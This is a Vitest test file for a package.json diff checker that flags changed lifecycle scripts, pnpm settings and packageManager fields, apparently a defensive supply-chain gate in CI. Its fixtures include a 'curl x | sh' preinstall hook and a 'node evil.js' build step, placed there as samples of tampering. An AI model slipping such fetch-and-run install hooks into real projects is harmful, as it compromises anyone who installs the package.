import { describe, it, expect } from 'vitest';
import { diffPackageJson } from './package-json.ts';

const base = JSON.stringify({
  name: '@backspace/desktop',
  scripts: { build: 'tsc', postinstall: 'electron-rebuild || true' },
  devDependencies: { electron: '^40.10.6' },
});

describe('diffPackageJson', () => {
  it('ignores a plain dependency bump', () => {
    const head = base.replace('^40.10.6', '^43.4.0');
    expect(diffPackageJson('packages/desktop/package.json', base, head)).toEqual({ ok: true, keys: [] });
  });

  it('reports an added lifecycle script', () => {
    const head = JSON.stringify({
      name: '@backspace/desktop',
      scripts: { build: 'tsc', postinstall: 'electron-rebuild || true', preinstall: 'curl x | sh' },
      devDependencies: { electron: '^40.10.6' },
    });
    expect(diffPackageJson('p', base, head)).toEqual({ ok: true, keys: ['scripts.preinstall'] });
  });

  it('reports any changed script, not only lifecycle ones, because CI runs them verbatim', () => {
    const head = base.replace('"build":"tsc"', '"build":"node evil.js && tsc"');
    expect(diffPackageJson('p', base, head)).toEqual({ ok: true, keys: ['scripts.build'] });
  });

  it('reports a removed script', () => {
    const head = JSON.stringify({ name: '@backspace/desktop', scripts: { build: 'tsc' }, devDependencies: {} });
    expect(diffPackageJson('p', base, head)).toEqual({ ok: true, keys: ['scripts.postinstall'] });
  });

  it('reports changes anywhere under pnpm, naming the sub-key', () => {
    const b = JSON.stringify({ pnpm: { onlyBuiltDependencies: ['sharp'], overrides: { a: '1' } } });
    const h = JSON.stringify({ pnpm: { onlyBuiltDependencies: ['sharp', 'foo'], overrides: { a: '1' }, allowBuilds: { x: true } } });
    expect(diffPackageJson('p', b, h)).toEqual({ ok: true, keys: ['pnpm.onlyBuiltDependencies', 'pnpm.allowBuilds'] });
  });

  it('reports a packageManager change', () => {
    const b = JSON.stringify({ packageManager: 'pnpm@10.34.3' });
    const h = JSON.stringify({ packageManager: 'pnpm@10.35.0' });
    expect(diffPackageJson('p', b, h)).toEqual({ ok: true, keys: ['packageManager'] });
  });

  it('treats a new package.json with scripts as all-added', () => {
    const h = JSON.stringify({ scripts: { test: 'vitest', postinstall: 'x' } });
    expect(diffPackageJson('p', null, h)).toEqual({ ok: true, keys: ['scripts.test', 'scripts.postinstall'] });
  });

  it('treats a new package.json without scripts or pnpm block as routine', () => {
    expect(diffPackageJson('p', null, JSON.stringify({ name: 'x', dependencies: {} }))).toEqual({ ok: true, keys: [] });
  });

  it('treats a deleted package.json that had scripts as all-removed', () => {
    expect(diffPackageJson('p', base, null)).toEqual({ ok: true, keys: ['scripts.build', 'scripts.postinstall'] });
  });

  it('fails closed on unparseable head content', () => {
    const result = diffPackageJson('p', base, '{ not json');
    expect(result.ok).toBe(false);
  });

  it('fails closed when head is not an object', () => {
    expect(diffPackageJson('p', base, '[]').ok).toBe(false);
    expect(diffPackageJson('p', base, 'null').ok).toBe(false);
  });

  it('fails closed on unparseable base content too, since the diff would be meaningless', () => {
    expect(diffPackageJson('p', 'nope', base).ok).toBe(false);
  });

  it('is order-insensitive for unchanged objects', () => {
    const b = JSON.stringify({ scripts: { a: '1', b: '2' }, pnpm: { overrides: { x: '1', y: '2' } } });
    const h = JSON.stringify({ pnpm: { overrides: { y: '2', x: '1' } }, scripts: { b: '2', a: '1' } });
    expect(diffPackageJson('p', b, h)).toEqual({ ok: true, keys: [] });
  });
});
